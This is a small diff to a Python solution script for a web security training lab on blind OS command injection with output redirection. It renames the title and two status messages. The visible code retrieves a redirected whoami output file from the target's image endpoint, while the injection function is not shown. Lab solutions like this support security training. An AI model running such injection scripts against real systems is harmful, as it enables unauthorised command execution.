@@ -1,4 +1,4 @@
-# Lab: Blind SSRF OS command Injection with output redirection
+# Lab: Blind SSRF OS command 03 - Injection with output redirection
 import sys
 import urllib3
 import urllib.parse
@@ -33,7 +33,7 @@ def get_content(s, url):
     path = "/image?filename=whoami.txt"
     r = s.get(url + path, verify=False, proxies=proxies)
     if r.status_code == 200:
-        print("(-> Injection successfully executed !")
+        print("(-> 03 - Injection successfully executed !")
         print(r.text)
     else:
         print(f"(-) Couldn't get content from {path}")
@@ -63,7 +63,7 @@ def main():
         sys.exit(-1)
 
     url = sys.argv[1]
-    print("(-> Blind SSRF OS command Injection with output redirection...")
+    print("(-> Blind SSRF OS command 03 - Injection with output redirection...")
     s = requests.Session()
     os_command_injection(s, url)
 
